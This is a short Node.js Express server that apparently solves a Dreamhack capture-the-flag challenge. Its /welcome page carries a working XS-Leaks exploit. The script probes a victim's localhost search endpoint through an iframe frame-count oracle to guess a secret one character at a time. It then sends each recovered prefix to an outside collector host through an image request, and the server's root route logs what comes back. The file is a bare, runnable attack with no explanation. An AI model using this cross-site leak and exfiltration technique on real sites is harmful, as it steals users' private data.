var express = require('express');
var url = require('url');
var app = express();

app.use(express.urlencoded({extended:true}))

app.get('/', (req, res) => {
  param = decodeURI(url.parse(req.url).search).substr(1);
  console.log("/?", param);
  res.send('thx');
});

app.get('/welcome', (req, res) => {
  res.send(`
<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const iframe = document.getElementById("iframe");
            iframe.src = url;
            iframe.onload = () => { 
                if (iframe.contentWindow.frames.length != 0)
                    return resolve();
                else
                    return reject();
            };
        });
    }
    async function search(query) {
        try {
            await req('http://localhost:8000/search?query=${query}');
            return true;
        } catch (e) {
            return false;
        }
    }
    async function exploit() {
        let chars = "0123456789abcdef}"
        let secret = "DH{";
        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = 'https://tshiziv.request.dreamhack.games/${secret}';
                    break;
                }
            }
        }
    }
    exploit();
</script>
  `);
});

app.listen(3000, () => {
  console.log('server started');
});
